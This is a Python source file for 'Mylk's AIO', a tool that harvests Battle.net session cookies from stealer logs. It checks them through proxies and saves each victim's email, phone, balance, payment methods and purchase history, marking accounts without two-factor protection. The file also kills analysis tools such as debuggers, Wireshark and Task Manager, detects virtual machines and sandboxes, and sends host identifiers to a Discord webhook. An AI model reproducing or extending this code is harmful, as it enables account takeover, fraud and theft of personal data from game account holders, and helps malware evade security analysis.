###############################################MODULES###############################################

import functools
import tkinter
from tkinter import filedialog
import requests
import subprocess
import json
import os
import time
import json as jsond
import win32gui
import win32con
import binascii
from uuid import uuid4
import win32gui
import win32con
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
import platform
import datetime
import sys
import os.path
import colorama
from colorama import Fore
import re
import ctypes
import uuid
import platform
import wmi
import psutil
from urllib.request import Request, urlopen
import dhooks
from dhooks import Webhook
import threading
import webbrowser
import pystyle
from pystyle import Colors, Colorate, Center, Write
import urllib3
from winproxy import ProxySetting
from mitmproxy import http
import mitmproxy
import random
import string
import shutil
import codecs
import aiohttp
import glob
import concurrent.futures
from requests.adapters import Retry, HTTPAdapter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
################################################################################################

def clear(): return os.system('cls' if os.name in ('nt', 'dos') else 'clear')

clear()

################################################################################################

vmcheck_switch = True  
vtdetect_switch = True  
listcheck_switch = True
anti_debug_switch = True  
api = ""  
live_ban_checking = True
programblacklist = ["httpdebuggerui.exe", "wireshark.exe", "HTTPDebuggerSvc.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
                    "pestudio.exe", "vmwareuser", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]

logoL = """
███╗   ███╗██╗   ██╗██╗     ██╗  ██╗███████╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ 
████╗ ████║╚██╗ ██╔╝██║     ██║ ██╔╝██╔════╝    ██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██╔████╔██║ ╚████╔╝ ██║     █████╔╝ ███████╗    ██║     ██║   ██║███████║██║  ██║█████╗  ██████╔╝
██║╚██╔╝██║  ╚██╔╝  ██║     ██╔═██╗ ╚════██║    ██║     ██║   ██║██╔══██║██║  ██║██╔══╝  ██╔══██╗
██║ ╚═╝ ██║   ██║   ███████╗██║  ██╗███████║    ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║

                                                                               """

                                                                               
logo = """
                                  _____       
                                 j_____j      ███╗   ███╗██╗   ██╗██╗     ██╗  ██╗███████╗     █████╗ ██╗ ██████╗ 
                                /_____/_\     ████╗ ████║╚██╗ ██╔╝██║     ██║ ██╔╝██╔════╝    ██╔══██╗██║██╔═══██╗
                                |_(~)_| |     ██╔████╔██║ ╚████╔╝ ██║     █████╔╝ ███████╗    ███████║██║██║   ██║
                                | )"( | |     ██║╚██╔╝██║  ╚██╔╝  ██║     ██╔═██╗ ╚════██║    ██╔══██║██║██║   ██║
                                |(@_@)| |     ██║ ╚═╝ ██║   ██║   ███████╗██║  ██╗███████║    ██║  ██║██║╚██████╔╝
                                |_____|,'     ╚═╝     ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝ ╚═════╝ 
                                                                               """

cpm1, cpm, good, custom, bad, checked, errors, total = 0, 0, 0, 0, 0, 0, 0, 0
PROXY_LIST = []
BASE_ADDRESS_BNET = "https://account.battle.net"
HEADERS = {"User-Agent": "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00"}
BREAKTHREAD = 1
SCREEN_THREADS = []

################################################################################################

class bNet:
    def battlenet_cookie_checker(self, bNetCookieLines, num):
        global cpm1, cpm, checked, good, custom, bad, errors

        try:
            transactions = []

            session = requests.Session()

            while True:
                sel_proxy = random.choice(PROXY_LIST)
                session.proxies.update({'socks4': 'http://{}'.format(sel_proxy), 'socks4': 'https://{}'.format(sel_proxy)})

                try:
                    response = session.get("https://account.battle.net/", timeout=2)
                    if response.status_code == 200:
                        break
                except:
                    errors += 1
                    continue

            session.base_url = BASE_ADDRESS_BNET
            current_cookie = bNetCookieLines[num]
            session.cookies.update({"BA-tassadar": f"{current_cookie}"})
            session.mount("http://", requests.adapters.HTTPAdapter(max_retries=3))
            session.mount("https://", requests.adapters.HTTPAdapter(max_retries=3))
            try:
                responseA = session.get("https://account.battle.net:443/oauth2/authorization/account-settings", headers=HEADERS)
                responseB = session.get("https://account.battle.net/api/overview", headers=HEADERS)
                paymentMethod = session.get("https://account.battle.net/api/wallet", headers=HEADERS)
            except ConnectionResetError:
                pass

            codTitles = {
            "Call of Duty®: Black Ops Cold War": False,
            "Call of Duty®: Modern Warfare®": False,
            "Call of Duty®: Modern Warfare® II": False,
            "Call of Duty®: Vanguard": False,
            }

            if responseA.status_code == 200 and responseB.status_code == 200:
                overview_json = json.loads(responseB.content.decode("utf-8"))
                transactions = [
                    {
                        "formattedTotal": purchase["formattedTotal"],
                        "productTitle": purchase["productTitle"],
                        "quantity": purchase["quantity"],
                        "date": datetime.datetime.fromtimestamp(purchase["date"] / 1000.0).strftime("%Y-%m-%d %H:%M:%S"),
                    }
                    for region_id in [1, 2, 3]
                    for purchase in json.loads(session.get(f"https://account.battle.net/api/transactions?regionId={region_id}", headers=HEADERS).content.decode("utf-8"))["purchases"]
                ]

                paymentOverview_json = json.loads(paymentMethod.content.decode("utf-8"))
                payment_methods = [payment_method['label'] for payment_method in paymentOverview_json['walletList']]

                fileTag = battle_tag = overview_json['accountDetails']['battleTag']
                cwd = os.getcwd()

                if transactions.__len__() != 0:
                    good += 1
                    cpm += 1
                    checked += 1

                    target_folder = os.path.join(cwd, "Checked", "BattleNet", "Games")

                    for transaction in transactions:
                        for specificCOD in codTitles:
                            if specificCOD in transaction["productTitle"]:
                                codTitles[specificCOD] = True
                    
                    for codTitle in codTitles:
                        if codTitles[codTitle] == True:
                            target_folder = os.path.join(cwd, "Checked", "BattleNet", "Games", re.sub(r'[^\w\s]', '_', codTitle))
                        if sum(codTitles.values()) > 1:
                            target_folder = os.path.join(cwd, "Checked", "BattleNet", "Games", "Multiple")
                            
                    if any("paypal".lower() in method.lower() for method in payment_methods):
                        fileTag = f"{battle_tag} - Paypal"

                    if overview_json['accountSecurityStatus']['smsProtectAttached'] == False and overview_json['accountSecurityStatus']['authenticatorAttached'] == False:
                        target_folder = os.path.join(target_folder, "No Phone")
                    elif overview_json['accountSecurityStatus']['authenticatorAttached'] == True and overview_json['accountSecurityStatus']['smsProtectAttached'] == True:
                        target_folder = os.path.join(target_folder, "Auth")

                    file_path = os.path.join(target_folder, f"[!] {fileTag}.txt")

                    os.makedirs(os.path.dirname(file_path), exist_ok=True)

                    with open(file_path, "w", encoding="utf-8") as f:
                        json.dump(
                            {
                                "Cookie": current_cookie,
                                "Battle Tag": battle_tag,
                                "================================": " ",
                                "Account Details": " ",
                                "First Name": overview_json['accountDetails']['firstName'],
                                "Last Name": overview_json['accountDetails']['lastName'],
                                "Email": overview_json['accountDetails']['email'],
                                "Currency": overview_json['accountBalance']['currency'],
                                "Balance": overview_json['accountBalance']['balance'],
                                "=================================": " ",
                                "Authentication": " ",
                                "Authenticator": overview_json['accountSecurityStatus']['authenticatorAttached'],
                                "SMS Verification": overview_json['accountSecurityStatus']['smsProtectAttached'],
                                "Phone": overview_json['accountDetails']['accountCountryDialingCode'] + " " + overview_json['accountDetails']['smsProtectPhone'],
                                "==================================": " ",
                                "Payment Methods": " ",
                                "Attached": payment_methods,
                                "===================================": " ",
                                "Transactions": transactions,
                            },
                            f, 
                            ensure_ascii=False,
                            indent=4, 
                        )
                else:
                    custom += 1
                    cpm += 1
                    checked += 1

                    target_folder = os.path.join(cwd, "Checked", "BattleNet")

                    if any("paypal".lower() in method.lower() for method in payment_methods):
                        target_folder = os.path.join(cwd, "Checked", "BattleNet", "Paypal")

                    file_path = os.path.join(target_folder, f"[!] {battle_tag}.txt")

                    os.makedirs(os.path.dirname(file_path), exist_ok=True)

                    with open(file_path, "w", encoding="utf-8") as f:
                        json.dump(
                            {
                                "Cookie": current_cookie,
                                "Battle Tag": battle_tag,
                                "================================": " ",
                                "Account Details": " ",
                                "First Name": overview_json['accountDetails']['firstName'],
                                "Last Name": overview_json['accountDetails']['lastName'],
                                "Email": overview_json['accountDetails']['email'],
                                "Currency": overview_json['accountBalance']['currency'],
                                "Balance": overview_json['accountBalance']['balance'],
                                "=================================": " ",
                                "Authentication": " ",
                                "Authenticator": overview_json['accountSecurityStatus']['authenticatorAttached'],
                                "SMS Verification": overview_json['accountSecurityStatus']['smsProtectAttached'],
                                "Phone": overview_json['accountDetails']['accountCountryDialingCode'] + " " + overview_json['accountDetails']['smsProtectPhone'],
                                "==================================": " ",
                                "Payment Methods": " ",
                                "Attached": payment_methods,
                                "===================================": " ",
                            },
                            f,
                            indent=4,
                        )
            else:
                bad += 1
                cpm += 1
                checked += 1

        except Exception as e:
            pass

    def BNet_cookie_grabber(self):
        global total, checked
        self.app.printLogo()
        cwd = os.getcwd()
        cookie_files = cwd + "\\Parsed\\BattleNet\\MBattleNet.txt"

        global bNetCookieLines, threadc
        with open(cookie_files, "r") as f:
            bNetCookieLines = f.readlines()
            bNetCookieLines = [bNetCookieLines.strip() for bNetCookieLines in bNetCookieLines]
            total = bNetCookieNumLines = len(bNetCookieLines)
        self.app.printColored(Colors.blue_to_purple, "                                                                 Found {} cookies.".format(bNetCookieNumLines))
        print()
        self.app.printColored(Colors.blue_to_purple, "                                                                 How many threads would you like?")
        threadc = int(Write.Input("                                                [>] ", Colors.blue_to_purple, interval=0))
        print()
        self.app.screen()
        num = 0
        BREAKTHREAD = 1
        while 1:
            if threading.active_count() < int(threadc):
                if total > num:
                    threading.Thread(target=self.battlenet_cookie_checker, args=(bNetCookieLines, num)).start()
                    num+=1
                    #checked+=1
                else:
                    for i in SCREEN_THREADS:
                        i.join()
                    self.app.menu()
            else:
                time.sleep(0.1)
        
        #ret = input(Write.Input("[!] Done parsing... Press enter to return....", Colors.blue_to_purple, interval=0))
        self.app.menu()

    def BNet_file_parser(self, bNetParserFileList, num):
            global bNetFoundCookieCount, bNetFileCount, cpm
            if num < len(bNetParserFileList):
                file = bNetParserFileList[num]
                if "MBattleNet" in file or "[!]" in file:
                    pass
                with open(file, "r", errors="replace") as f:
                    lines = f.readlines()

                    cookies = [line.split("BA-tassadar")[1] for line in lines if "	BA-tassadar	" in line]
                    bNetCookiesList.extend(cookies)
                    bNetFoundCookieCount += len(cookies)
                    if len(cookies) > 0:
                        self.app.printColored(Colors.rainbow, "[!] Cookies Found!")
                        cpm += 1
                    #self.app.printColored(Colors.rainbow, "[!] Cookies Found")
                    # for line in lines:
                    #     if "	BA-tassadar	" not in line:
                    #         continue
                    #     bNetCookiesList.append(line.split("BA-tassadar")[1])
                    #     bNetFoundCookieCount += 1
                    #     self.app.printColored(Colors.rainbow, "[!] Cookies Found")
                if delFileBNet == 1: os.remove(file)
                bNetFileCount -= 1

    def search_for_files(self, dir, bNetParserFileList):
        with os.scandir(dir) as entries:
            for entry in entries:
                if entry.is_file() and entry.name.endswith(".txt") and "filegrabber" not in entry.name and "autofills" not in entry.name:
                    bNetParserFileList.append(entry.path)
                elif entry.is_dir():
                    self.search_for_files(entry.path, bNetParserFileList)

    def BNet_file_grabber(self):
        global delFileBNet, bNetCookiesList, bNetParserFileList, bNetFoundCookieCount, bNetFileCount
        self.app.printLogo()
        current_dir = os.getcwd()
        bNetParserFileList = []
        bNetCookiesList = []
        bNetFoundCookieCount = 0

        self.app.printColored(Colors.blue_to_purple, "                                                                 Would you like to delete the file after its been checked?")
        self.app.printColored(Colors.blue_to_purple, "                                                                 [1] True")
        self.app.printColored(Colors.blue_to_purple, "                                                                 [2] False")
        delFileBNet = int(Write.Input("                                                [>] ", Colors.blue_to_purple, interval=0))

        print()
        self.app.printColored(Colors.blue_to_purple, "                                                                 How many threads would you like?")
        threadc = int(Write.Input("                                                [>] ", Colors.blue_to_purple, interval=0))
        print()

        self.app.printColored(Colors.blue_to_purple, "                                                                 Select your logs directory.")

        prop = tkinter.Tk()
        prop.withdraw()
        fileNameFiles = filedialog.askdirectory()
        prop.destroy()

        threads = []

        for entry in os.scandir(current_dir):
            if entry.is_dir():
                thread = threading.Thread(target=self.search_for_files, args=(entry.path, bNetParserFileList))
                thread.start()
                threads.append(thread)

        for thread in threads:
            thread.join()

        threads.clear()

        bNetFileCount = len(bNetParserFileList)

        os.system("cls")

        num = 0
        cpm1 = 0
        cpm = 0
        while 1:
            if threading.active_count() < int(threadc):
                if bNetFileCount > 1:
                    t = threading.Thread(target=self.BNet_file_parser, args=(bNetParserFileList, num))
                    threads.append(t)
                    t.start()
                    cpm1 = cpm
                    cpm = 0
                    ctypes.windll.kernel32.SetConsoleTitleW(f"[!] Mylk's AIO | Parsing | Files Left: {bNetFileCount} | Cookies Found: {bNetFoundCookieCount} | CPM {cpm1}")
                    num+=1
                else:
                    break

        for thread in threads:
            thread.join()

        dir = os.getcwd() + "\\Parsed\\BattleNet"
        bNetCookiesList = list(set(bNetCookiesList))
        with open(dir + "\\MBattleNet.txt", "w") as combined_file:
            for file in bNetCookiesList:
                combined_file.write(file.lstrip("\t"))
            combined_file.write(file.rstrip("\n").lstrip("\t"))

        ctypes.windll.kernel32.SetConsoleTitleW(f"[!] Mylk's AIO | Parsing | Files Left: {bNetFileCount} | Cookies Found: {bNetFoundCookieCount - 1}")

        combined_file.close()
        time.sleep(1)
        clear()
        self.app.printColored(Colors.blue_to_purple, "                                                                 Removing duplicates....")
        time.sleep(1)
        self.app.printColored(Colors.blue_to_purple, "                                                                 Saving the results....")
        time.sleep(1)
        self.app.printColored(Colors.blue_to_purple, "                                                                 Done parsing... press anything to return")
        input()
        self.app.menu()

    def BNet_LogIn(self):
        global p, loginCookie
        subprocess.run(["taskkill", "/F", "/IM", "Battle.net.exe"])
        os.system("cls")
        self.app.printLogo()
        self.app.printColored(Colors.blue_to_purple, "                                                                 Enter your Battle.net Cookie")
        loginCookie = Write.Input("                                                [>] ", Colors.blue_to_purple, interval=0)

        p = ProxySetting()

        p.server = dict(http='127.0.0.1:8080', https='127.0.0.1:8080')
        p.enable = True
        p.registry_write()

        self.app.printColored(Colors.blue_to_purple, "                                                                 Open Battle.net Client...")

    def __init__(self, app):
        self.app = app


class app:
    
    def printLogo(self):
        print(Center.XCenter(Colorate.Vertical(Colors.white_to_blue, logo, 1)))
    
    def printColored(self, Color, Text):
        print(Center.XCenter(Colorate.Horizontal(Color, Text, 1)))

    def has_non_ascii_chars(self, s):
        try:
            s.encode('ascii')
            return False
        except UnicodeEncodeError:
            return True

    def RandomString(self, stringLength):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(stringLength))

    def convert_to_float(self, price_string):
        price_string = price_string.replace(',', '.')
        price_string = ''.join(c for c in price_string if c.isdigit() or c == '.')
        price_float = float(price_string)
        return price_float
        
    #===============================================================================================================================================================

    def load_proxies(self):
        os.system("cls")
        self.printLogo()
        print()
        self.printColored(Colors.blue_to_purple, "                                                                 Mylks AIO - Monkey See Monkey Do")
        print()
        self.printColored(Colors.blue_to_purple, "                                                                 Please Load You're SOCKS4 Proxies")
        Write.Input("                                                                 Press Enter to Select Proxies ", Colors.blue_to_purple, interval=0)
        prop = tkinter.Tk()
        prop.withdraw()
        fileNameProxy = filedialog.askopenfile(parent=prop, mode='rb', title='Choose a proxy file (http/s)',
                                    filetype=((".txt", "*.txt"), ("All files", "*.txt")))
        with open(fileNameProxy.name, 'r+') as n:
            proxypath = n.readlines()
            for linie_proxy in proxypath:
                linie_prox = linie_proxy.split()[0]
                PROXY_LIST.append(linie_prox)
        prop.destroy()
        self.menu()

    def screen(self):
        global cpm1, cpm, checked, good, custom, bad, errors, BREAKTHREAD, SCREEN_THREADS, total
        os.system("cls")
        #print(BREAKTHREAD)
        cpm1 = cpm
        cpm = 0
        ctypes.windll.kernel32.SetConsoleTitleW("Mylk's AIO | Checked: {}/{} | Good: {} | Custom: {} | Bad: {} | CPM: {}".format(checked, total, good, custom, bad, cpm1*60))
        self.printLogo()
        print()
        self.printColored(Colors.blue_to_purple, "                                                         Mylks AIO - Monkey See Monkey Do")
        self.printColored(Colors.blue_to_purple, "                                                                 Checked - [{}/{}]".format(checked, total))
        self.printColored(Colors.blue_to_purple, "                                                                 Good - [{}]".format(str(good)))
        self.printColored(Colors.blue_to_purple, "                                                                 Custom - [{}]".format(str(custom)))
        self.printColored(Colors.blue_to_purple, "                                                                 Bad - [{}]".format(str(bad)))
        self.printColored(Colors.blue_to_purple, "                                                                 Errors - [{}]".format(str(errors)))
        self.printColored(Colors.blue_to_purple, "                                                                 CPM - [{}]".format(str(cpm1*60)))
        time.sleep(.5)
        screenThread = threading.Thread(target=self.screen, args=()).start()
        SCREEN_THREADS.append(screenThread)
            
    #=======================================================================================================================================================================

    def menu(self):
        current_dir = os.getcwd()

        folders = ["Parsed", "Parsed\\Roblox", "Parsed\\BattleNet", "\\Checked", "Checked\\BattleNet", "Checked\\Roblox", "Checked\\BattleNet\\Games", "Checked\\BattleNet\\Paypal"]

        for folder in folders:
            folder_path = os.path.join(current_dir, folder)
            if not os.path.exists(folder_path):
                os.makedirs(folder_path)

        codTitles = {
            "Call of Duty®: Black Ops Cold War": False, 
            "Call of Duty®: Modern Warfare®": False,
            "Call of Duty®: Modern Warfare® II": False,
            "Call of Duty®: Vanguard": False,
            }

        for game in codTitles:
            game_path = os.path.join(current_dir, "Checked", "BattleNet", "Games", re.sub(r'[^\w\s]', '_', game))
            
            if not os.path.exists(game_path):
                os.makedirs(game_path)

        os.system("mode 150,50")
        os.system("cls")

        ctypes.windll.kernel32.SetConsoleTitleW("[!] Mylk's AIO")
        self.printLogo()
        print()
        self.printColored(Colors.blue_to_purple, "                                                         Mylks AIO - Monkey See Monkey Do")
        print()
        self.printColored(Colors.blue_to_purple, "                                                                 [1] Parse Files")
        self.printColored(Colors.blue_to_purple, "                                                                 [2] Check Files")
        self.printColored(Colors.blue_to_purple, "                                                                 [3] Load Proxy")
        self.printColored(Colors.blue_to_purple, "                                                                 [4] BNet Login")
        try:
            choice = int(Write.Input("                                                [>] ", Colors.blue_to_purple, interval=0))

            if choice == 1:
                os.system("cls")
                self.bNetApp.BNet_file_grabber()

            elif choice == 2:
                os.system("cls")
                self.bNetApp.BNet_cookie_grabber()

            elif choice == 3:
                os.system("cls")
                self.load_proxies()

            elif choice == 4:
                os.system("cls")
                #login()
                self.bNetApp.BNet_LogIn()

            else:
                self.printColored(Colors.red_to_black, "                                                [!] Invalid Choice")
                time.sleep(1.5)
                self.menu()
        except ValueError:
            self.printColored(Colors.red_to_black, "                                                Enter a valid number")
            time.sleep(1.5)
            self.menu()
    
    def __init__(self):
        self.bNetApp = bNet(self)

################################################################################################

def printLLogo():
    print(Center.XCenter(Colorate.Vertical(Colors.white_to_blue, logoL, 1)))

def block_debuggers():
    while True:
        time.sleep(1)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in programblacklist):
                try:
                    print("\nBlacklisted program found! Name: "+str(proc.name()))
                    proc.kill()
                    time.sleep(2)
                    os._exit(1)
                except(psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

def block_dlls():
    while True:
        time.sleep(1)
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

ip = getip()
serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_name = str(os_name).replace("'", "")
os_name = str(os_name).replace("b", "")
gpu = computer.Win32_VideoController()[0].Name
hwid = subprocess.check_output(
    'wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')

def vtdetect():
    webhooksend = Webhook(api)
    webhooksend.send(f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {gpu}
TIME: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")

def vmcheck():
    def get_base_prefix_compat():  
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv():
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True:  
        requests.post(f'{api}', json={
                      'content': f"**VM DETECTED EXITING PROGRAM...**"})
        os._exit(1)  

    else:
        pass

    def registry_check():  # VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")

        if reg1 != 1 and reg2 != 1:
            print("VMware Registry Detected")
            requests.post(f'{api}', json={
                          'content': f"**VMware Registry Detected**"})
            os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(
            os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(
            os.environ["SystemRoot"], "vboxmrxnp.dll")

        process = os.popen(
            'TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace(
                    "K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            requests.post(f'{api}', json={
                          'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            os._exit(1)

        if os.path.exists(vmware_dll):
            print("Vmware DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**Vmware DLL Detected**"})
            os._exit(1)

        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**VirtualBox DLL Detected**"})
            os._exit(1)

        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}', json={
                          'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            requests.post(f'{api}', json={
                          'content': f"**VMware MAC Address Detected**"})
            os._exit(1)
    print("[*] Checking VM")
    registry_check()
    processes_and_files_check()
    mac_check()
    print("[+] VM Not Detected : )")
    webhooksend = Webhook(api)
    webhooksend.send("[+] VM Not Detected : )")

def listcheck():
    try:
        if hwid in hwidlist.text:
            print('BLACKLISTED HWID DETECTED')
            print(f'HWID: {hwid}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            print('BLACKLISTED PC USER DETECTED!')
            print(f'PC USER: {serveruser}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted PC User:** `{serveruser}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            print('BLACKLISTED PC NAME DETECTED!')
            print(f'PC NAME: {pc_name}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted PC Name:** `{pc_name}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if ip in iplist.text:
            print('BLACKLISTED IP DETECTED!')
            print(f'IP: {ip}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted IP:** `{ip}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if mac in maclist.text:
            print('BLACKLISTED MAC DETECTED!')
            print(f'MAC: {mac}')
            requests.post(f'{api}', json={
                          'content': f"**Blacklisted MAC:** `{mac}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if gpu in gpulist.text:
            if gpu == "Virtual Desktop Monitor":
                pass
            else:
                print('BLACKLISTED GPU DETECTED!')
                print(f'GPU: {gpu}')
                requests.post(f'{api}', json={
                            'content': f"**Blacklisted GPU:** `{gpu}`"})
                time.sleep(2)
                os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

if anti_debug_switch == True:
    try:
        b = threading.Thread(name='Anti-Debug', target=block_debuggers)
        b.start()
        b2 = threading.Thread(name='Anti-DLL', target=block_dlls)
        b2.start()
    except:
        pass
else:
    pass

if vtdetect_switch == True:
    vtdetect()
else:
    pass
if vmcheck_switch == True:
    vmcheck()
else:
    pass
if listcheck_switch == True:
    listcheck()
else:
    pass

def upgrade(username: str, key: str) -> bool:
    hwid = subprocess.check_output(
        'wmic csproduct get uuid').decode().split('\n')[1].strip()
    init_url = "https://auth.gamingchair.pro/api/1.1/?type=init&ver=1.1&name=BNetChecker&ownerid=nvdGVra6wS"
    try:
        with requests.post(init_url) as response:
            if response.status_code == 200:
                if response.json()["success"]:
                    sessionId = response.json()["sessionid"]
                    api_url = f"https://auth.gamingchair.pro/api/1.1/?type=upgrade&username={username}&key={key}&sessionid={sessionId}&name=BNetChecker&ownerid=nvdGVra6wS"
                    try:
                        with requests.post(api_url) as response2:
                            if response2.status_code == 200:
                                if response2.json()["success"]:
                                    #print(" Registered!")
                                    return True
                                else:
                                    message = response2.json()["message"]
                                    print(f" Error: {message}")
                                    return False
                            else:
                                print(Center.XCenter(Colorate.Horizontal(
                                    Colors.white_to_red, "Failed!", 1)))
                                return False
                    except Exception as e:
                        print(F" Error: {e}")
                        return False
                else:
                    message = response.json()["message"]
                    print(f" Error: {message}")
                    return False
            else:
                print(Center.XCenter(Colorate.Horizontal(
                    Colors.white_to_red, "Failed!", 1)))
                return False
    except Exception as e:
        print(F" Error: {e}")
        return False

def register(username: str, password: str, key: str) -> bool:
    hwid = subprocess.check_output(
        'wmic csproduct get uuid').decode().split('\n')[1].strip()
    init_url = "https://auth.gamingchair.pro/api/1.1/?type=init&ver=1.1&name=BNetChecker&ownerid=nvdGVra6wS"
    try:
        with requests.post(init_url) as response:
            if response.status_code == 200:
                if response.json()["success"]:
                    sessionId = response.json()["sessionid"]
                    api_url = f"https://auth.gamingchair.pro/api/1.1/?type=register&username={username}&pass={password}&key={key}&hwid={hwid}&sessionid={sessionId}&name=BNetChecker&ownerid=nvdGVra6wS"
                    try:
                        with requests.post(api_url) as response2:
                            if response2.status_code == 200:
                                if response2.json()["success"]:
                                    #print(" Registered!")
                                    return True
                                else:
                                    message = response2.json()["message"]
                                    print(f" Error: {message}")
                                    return False
                            else:
                                print(Center.XCenter(Colorate.Horizontal(
                                    Colors.white_to_red, "Failed!", 1)))
                                return False
                    except Exception as e:
                        print(F" Error: {e}")
                        return False
                else:
                    message = response.json()["message"]
                    print(f" Error: {message}")
                    return False
            else:
                print(Center.XCenter(Colorate.Horizontal(
                    Colors.white_to_red, "Failed!", 1)))
                return False
    except Exception as e:
        print(F" Error: {e}")
        return False

def login(username: str, password: str) -> bool:
    hwid = subprocess.check_output(
        'wmic csproduct get uuid').decode().split('\n')[1].strip()
    init_url = "https://auth.gamingchair.pro/api/1.1/?type=init&ver=1.1&name=BNetChecker&ownerid=nvdGVra6wS"
    try:
        with requests.post(init_url) as response:
            if response.status_code == 200:
                if response.json()["success"]:
                    sessionId = response.json()["sessionid"]
                    api_url = f"https://auth.gamingchair.pro/api/1.1/?type=login&username={username}&pass={password}&hwid={hwid}&sessionid={sessionId}&name=BNetChecker&ownerid=nvdGVra6wS"
                    try:
                        with requests.post(api_url) as response2:
                            if response2.status_code == 200:
                                if response2.json()["success"]:
                                    #print(" Logged in!")
                                    return True
                                else:
                                    message = response2.json()["message"]
                                    print(f" Error: {message}")
                                    return False
                            else:
